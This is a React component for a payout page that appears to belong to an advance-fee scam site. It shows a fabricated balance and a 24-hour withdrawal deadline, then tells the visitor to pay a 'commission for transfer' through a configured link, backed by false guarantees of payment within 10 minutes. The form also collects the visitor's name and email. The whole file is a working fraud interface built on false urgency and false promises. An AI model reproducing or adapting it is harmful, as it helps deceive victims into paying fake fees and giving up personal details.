import moment from "moment"
import { Text, Flex, Box, Icon, Image, Button } from "@chakra-ui/react"
import React, { useState, useEffect, useCallback } from "react"
import { useTimer } from "react-timer-hook"
import ChatCard from "../../components/ChatCard"
import { useNavigate } from "react-router-dom"
import { useDispatch, useSelector } from "react-redux"
import { AiOutlineCheckCircle, AiOutlineCloseCircle } from "react-icons/ai"
import { thousandsFormatter, useGoTo } from "../../utils"
import FillForm from "../../components/Blocks/FillForm"
import FormCheckItem from "../../components/FormCheckItem"
import {
  CHAT_LAST_PAGE,
  COMMISSIONSP_PAGE,
  COMMISSION_PAGE,
  LAST_VISITED
} from "../../constants"
import CommissionForm from "../../components/Blocks/CommissionForm"

const nextPath = `/${COMMISSION_PAGE}/${COMMISSIONSP_PAGE}`
// 1-1
const Commissionfp = () => {
  const [iName, setIName] = useState("")
  const [iLastName, setILastName] = useState("")
  const [iEmail, setIEmail] = useState("")

  const balance = useSelector(state => state.user.balance)

  const links = useSelector(state => state.data.links)
  const prices = useSelector(state => state.data.prices)

  // const goToNext = useGoTo()

  const navigate = useNavigate()

  const onClick = useCallback(() => {
    const link = links?.[11]

    if (!link) return

    if (String(link).includes("http")) {
      window.open(link, "_self")
    } else {
      navigate(link)
    }
  }, [links?.[11]])

  const onNameChange = useCallback(
    event => {
      setIName(event.target.value)
    },
    [setIName]
  )

  const onEmailChange = useCallback(
    event => {
      setIEmail(event.target.value)
    },
    [setIName]
  )

  const onLastNameChange = useCallback(
    event => {
      setILastName(event.target.value)
    },
    [setIName]
  )

  return (
    <ChatCard
      position={"relative"}
      minH={{ base: "calc(100vh - 112px)", sm: "540px" }}
      bodyStyles={{
        padding: { base: "40px 20px 20px", md: "30px" }
      }}
    >
      <Box
        display={"grid"}
        gridTemplateColumns={{ base: "1fr", md: "1fr 1fr" }}
        gap={"30px"}
      >
        <Flex
          flexDir={"column"}
          alignItems={{ base: "center", md: "flex-start" }}
          gridColumn={{ md: "1" }}
          justifyContent={{ md: "center" }}
        >
          <Flex
            flexDir={{ base: "column", md: "row" }}
            alignItems={"center"}
            gap={{ md: "30px" }}
          >
            <Box textAlign={{ base: "center", md: "left" }}>
              <Text fontSize={{ base: "20px", md: "24px" }} fontWeight={"600"}>
                Your payout amount is:
              </Text>
              <Text
                fontSize={{ base: "40px", md: "40px" }}
                fontWeight={"bold"}
                color={"brand.600"}
                background={"linear-gradient(180deg, #7B2FD0 0%, #414DED 100%)"}
                whiteSpace={"nowrap"}
                sx={{
                  WebkitBackgroundClip: "text",
                  WebkitTextFillColor: "transparent"
                }}
              >
                {`$${thousandsFormatter(balance)}`}
                <Text as={"span"} fontSize={"18px"}>
                  {" "}
                  USD
                </Text>
              </Text>
            </Box>
            <Text
              color={"pink.100"}
              fontSize={{ base: "16px", md: "20px" }}
              textAlign={{ base: "center", md: "left" }}
              width={{ md: "40%" }}
            >
              You need to withdraw money within 24 hours!
            </Text>
          </Flex>
          <Text
            fontSize={{ base: "20px", md: "24px" }}
            fontWeight={"700"}
            textAlign={"center"}
            display={{ base: "inline-block", md: "none" }}
            m={"30px 0 20px"}
          >
            The payment system requests a commission for transfer
          </Text>
          <Text>
            In connection with the limits of pavment svstems, the transfer wil
            be sent by two equal parts during <b>10 minutes</b>
            <br /> <br />
            You need to pay for the commission for the transfer of your money.
            Atter paying for the commission, the transfer will be fully
            successtully sent on details!
          </Text>
          <Box
            mt={"30px"}
            display={"flex"}
            flexDir={"column"}
            alignItems={"flex-start"}
            width={"100%"}
          >
            <Text fontSize={{ base: "20px", md: "24px" }} mb={"15px"}>
              The commission for transferring tunds is: <b>${prices?.[11]}</b>
            </Text>
            <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
              <FormCheckItem
                checked={true}
                label={"We guarantee you a quick payment"}
              />
              <FormCheckItem
                checked={true}
                label={"Pay the commission for the transfer"}
              />
              <FormCheckItem
                checked={true}
                label={"Get your payment within 10 minutes"}
              />
            </Flex>
          </Box>
        </Flex>
        <Flex flexDir={"column"} justifyContent={{ md: "space-between" }}>
          <Text
            fontSize={{ base: "20px", md: "24px" }}
            fontWeight={"600"}
            display={{ base: "none", md: "inline-block" }}
          >
            The payment system requests a commission for transfer
          </Text>
          <CommissionForm
            nameValue={iName}
            emailValue={iEmail}
            lastNameValue={iLastName}
            onNameChange={onNameChange}
            onEmailChange={onEmailChange}
            onLastNameChange={onLastNameChange}
            gridColumn={{ md: "1" }}
            gridRow={{ md: "1/span 2" }}
          />
        </Flex>
      </Box>
      <Flex
        flexDir={{ base: "column-reverse", md: "row" }}
        justifyContent={{ md: "space-between" }}
        alignItems={"center"}
      >
        <Image
          src="./img/secure-payment.png"
          w={"120px"}
          margin={{ base: "50px auto", sm: "60px 0 0" }}
        />
        <Flex
          mt={"40px"}
          flexDir={{ base: "column", md: "row" }}
          alignItems={"center"}
        >
          <Button
            isDisabled={!iName || !iEmail || !iLastName}
            width={{ base: "190px", md: "230px" }}
            mb={"10px"}
            mr={{ md: "40px" }}
            onClick={onClick}
          >
            PAY THE COMMISSION
          </Button>
        </Flex>
      </Flex>
    </ChatCard>
  )
}

export default Commissionfp
